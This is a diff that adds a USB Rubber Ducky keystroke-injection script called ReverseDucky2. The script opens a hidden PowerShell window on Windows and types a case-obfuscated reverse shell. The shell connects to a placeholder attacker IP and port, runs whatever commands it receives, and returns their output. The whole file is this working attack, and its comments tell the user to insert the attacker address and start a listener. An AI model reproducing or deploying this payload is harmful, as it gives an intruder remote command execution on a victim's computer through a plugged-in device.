@@ -1,0 +1,27 @@
+REM       ReverseDucky2
+REM       Version 1.1
+REM       OS: Windows / Linux(?) (Not tested with Powershell on Linux)
+REM       Author: 0iphor13
+
+REM       Reverse shell executed in the background
+REM       Fill in Attacker-IP and Port in Line 19
+REM       DON'T FORGET TO START LISTENER
+
+
+DELAY 1500
+GUI r
+DELAY 500
+STRING powershell -NoP -NonI -W hidden
+DELAY 250
+ENTER
+
+DELAY 200
+STRING $c=nEw-oBjECt SYstEm.NEt.SOcKEts.TCPClIEnt("ATTACKER-IP",PORT);$s=$c.GetSTreAm();[byte[]]$b=0..65535|%{0};whILe(($i=$
+DELAY 100
+STRING s.REad($b,0,$b.LeNgTh))-ne 0){;$d=(NEw-OBjeCT -TYpeNamE sYsTeM.TeXt.ASCIIEncoding).GetStRIng($b,0,$i);$z=(ieX $d 2>&1|oU
+DELAY 100
+STRING t-STriNG);$x=$z+"RD "+(pwd)+"#";$y=([text.encoding]::ASCII).GEtByTEs($x);$s.WrIte($y,0,$y.LEnGTh);$s.FlUSh()};$c.CloSE()
+DELAY 100
+ENTER
+
+
